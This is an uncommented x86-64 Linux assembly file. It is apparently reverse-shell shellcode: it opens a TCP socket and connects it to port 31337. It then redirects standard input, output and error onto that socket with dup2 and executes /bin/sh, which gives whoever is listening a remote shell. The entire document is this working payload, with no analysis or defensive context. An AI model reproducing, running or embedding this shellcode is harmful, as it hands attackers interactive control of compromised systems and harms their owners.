
	.section .text
	.globl _start

_start:

	movb	$0x29,%al
	pushq	$2
	popq	%rdi
	incl	%esi
	syscall
	pushq	%rax
	popq	%rdi
	pushq	$0
	pushq	$0x697a0002
	movb	$0x2a,%al
	pushq	%rsp
	popq	%rsi
	movb	$0x10,%dl
	syscall
	pushq	$2
	popq	%rsi
.L0:
	movb	$0x21,%al
	syscall
	decl	%esi
	jns	.L0
	xorl	%eax,%eax
	pushq	%rax
	movq	$0x68732f2f6e69622f,%rdx
	pushq	%rdx
	pushq	%rsp
	popq	%rdi
	pushq	%rax
	pushq	%rsp
	popq	%rdx
	pushq	%rdi
	pushq	%rsp
	popq	%rsi
	movb	$0x3b,%al
	syscall

